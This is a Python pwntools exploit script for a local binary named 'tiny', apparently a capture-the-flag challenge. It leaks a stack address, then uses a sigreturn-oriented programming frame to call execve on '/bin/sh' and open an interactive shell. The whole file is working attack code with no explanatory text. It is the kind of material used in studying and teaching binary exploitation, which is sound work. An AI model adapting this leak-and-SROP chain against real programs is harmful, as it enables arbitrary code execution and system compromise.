from pwn import *
context.binary = exe =ELF('./tiny',checksec = False)

def GDB():
    gdb.attach(p,gdbscript='''
    b*0x4000b0
    c
    ''')
    input()
p = process(exe.path)
syscall = 0x4000be
payload = flat(
    0x4000b0,0x4000b3,0x4000b0,
)
#GDB()
p.send(payload)
p.send(b"\xb3")
p.recv(0x1a8)
leak = int.from_bytes(p.recv(8),"little") - 505
print(hex(leak))

###########
# Sig_ROP #
###########

BINSH_addr = leak + 272
print(hex(BINSH_addr))
frame = SigreturnFrame()
frame.rax = 0x3b
frame.rsp = syscall
frame.rip = syscall
frame.rdi = BINSH_addr
frame.rdx = 0
frame.rsi = 0

payload = flat(
    0x4000b0,
    syscall,
    bytes(frame),
    b"/bin/sh\x00",
)
p.sendline(payload)                 # set up register

payload = p64(syscall)              
payload = payload.ljust(0xf,b"\xaa")
p.send(payload)                     # sysread -> rax = 0xf -> sigFrame
input('send 15 bytes')
'''
'''
p.interactive()